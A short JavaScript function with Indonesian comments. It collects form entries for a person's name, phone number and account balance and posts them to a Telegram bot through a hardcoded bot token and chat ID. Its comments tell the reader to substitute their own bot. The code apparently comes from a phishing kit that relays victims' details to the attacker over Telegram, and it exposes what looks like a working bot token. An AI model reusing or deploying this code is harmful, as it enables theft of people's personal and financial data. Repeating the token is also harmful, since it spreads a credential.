function kirimPesan()
{
  var logo = document.getElementById('logo');
  var nama = document.getElementById('nama');
  var nomor = document.getElementById('nomor');
  var saldo = document.getElementById('saldo');
  
  var gabungan = logo.value + "%0A𝗡𝗮𝗺𝗮          :%20" + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗽  :%20' + nomor.value +'%0A%0A𝗦𝗮𝗹𝗱𝗼          :%20𝗥𝗽' + saldo.value;
  
  var token = '7826896424:AAE6w0wZPAtlo9-vvLRGzk-40UG_uTArZtA';// ganti dengan token bot yang kamu buat
  var grup = '7228666759';// ganti dengan chat Id dari bot yang kamu buat
  
  $.ajax({
    url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
  
  })
  
}
